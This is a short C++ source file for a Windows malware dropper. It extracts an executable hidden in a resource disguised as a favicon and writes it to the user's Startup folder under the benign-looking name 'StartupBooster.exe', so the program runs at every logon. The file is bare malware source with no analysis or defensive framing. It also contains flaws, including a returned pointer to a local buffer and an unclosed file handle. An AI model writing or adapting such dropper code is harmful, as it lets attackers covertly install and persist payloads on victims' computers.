#include "Dropper.h"
#include <iostream>

void Dropper::extractExe() 
{
	resrc = FindResource(NULL, MAKEINTRESOURCE(FAVICON_ICO), RT_RCDATA);
	resHandle = LoadResource(NULL, resrc);
	exeBin = (unsigned char*)LockResource(resHandle);
	exeBinLen = SizeofResource(NULL, resrc);
} 

wchar_t* Dropper::saveExeToDisk() 
{
	char destPath[500];
	wchar_t winDestPath[500];

	strcpy(destPath, getenv("HOMEPATH"));
	strcat(destPath, "\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\StartupBooster.exe");
	std::mbstowcs(winDestPath, destPath, strlen(destPath)+1);
	HANDLE newFile = CreateFile(winDestPath, GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
	WriteFile(newFile, exeBin, exeBinLen, NULL, NULL);

	return winDestPath;
}

void Dropper::dropMal() 
{
	extractExe();
	saveExeToDisk();
}